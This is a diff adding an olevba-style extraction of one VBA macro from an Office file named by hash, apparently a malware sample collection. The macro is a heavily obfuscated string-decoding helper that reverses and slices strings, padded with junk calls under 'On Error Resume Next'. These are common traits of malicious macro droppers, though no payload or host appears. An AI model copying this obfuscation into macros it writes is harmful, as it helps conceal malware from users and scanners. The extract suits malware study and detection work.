@@ -1,0 +1,20 @@
+Filename     : ./macros/b76824b10420587c0ebe40909841736ddc52ea6680471a6d79529a7cd30f2f5d
+OLE stream   : Macros/VBA/DJGpFLmsKVcIMk
+VBA filename : DJGpFLmsKVcIMk.bas
+----------------------------------------
+Attribute VB_Name = "DJGpFLmsKVcIMk"
+Function ytgUBhjkgbksad(ByVal KquCQJirEc As String, pAMimbAUJ, RQcZqvFnuEw)
+On Error Resume Next
+Call ikfiWdTJQlzaBwR.wwNwzZJjqDKjmAtQdzYYzclTjAqDI.kvsWfJwmMEbwsSTnXQrjwDXt.UNtPwjFYFSOn
+Call UkRrkTwwkSzvdaMbo.XzUKwFWQVWanzFAHvHPETDw.kvtTTItwQlqov.nLVUwaXwSuvViEM
+Call NTDQaBLDwMddWOPMMlTDjwFV.nczYwiokjXWkijmARYlztaE.jItkIAPOhkmYMfziotqqsb.CjDSaUYmNYUoplDbjIIDtwO
+jqXbYVauFRwFlf = maCIAkNmHarE + StrReverse(KquCQJirEc) + iptIwZ
+hbnlkNtGUHl = rqIzkRJikXoFSO + Mid(jqXbYVauFRwFlf, pAMimbAUJ, RQcZqvFnuEw) + zSQlcLhjOuz
+Call wSPuuWOwvSFXiaiCkll.qCpbsNwoJJtDlvLQVduiDSjhM.DCjfwdINfvcnBhZammYBmnPOhHr.iYSIOAKuHiNQ
+Call YQPnhbNJdfzILGPnSzplGiGcTZBX.SIYIGNWzbzfitFtVADtuHp.XiotJnTIZqdKWYzEstnqwJH.YNHTVHcXcbBdSUNM
+Call rGoPvWwAwBBTwi.XcUvfAmRNGivXWmY.bjGCSwdrKSXGbEdtmFpzRj.FoaJMbZiMdVrPc
+Call EfrEUhPLlBEBkQw.NvbBOrnQQloKdGMNRbAK.NLaqdpHIZpNPEH.oazNsanjsEhfpqkIPmQAjBLkCfIr
+ytgUBhjkgbksad = avZwPZqinRhZch + hbnlkNtGUHl + wJRRojzdnHNn
+Call NKNRwnRIIhaRuicUj.HTZotNrCPdSlqBmaRdEPc.QcnbrzuBVIDjGTqYQzZtYoqWqY.TNwQTzSDwARWsINHKhKuSk
+Call MFpiQbmQlSUboWrkioQtYzdhlKh.ojdMiUmLdPCbJkjDXhYkSzb.CqUNbIzFuGbEoI.TkjGTlokoSZKElwOrEWJrAYjVRw
+End Function
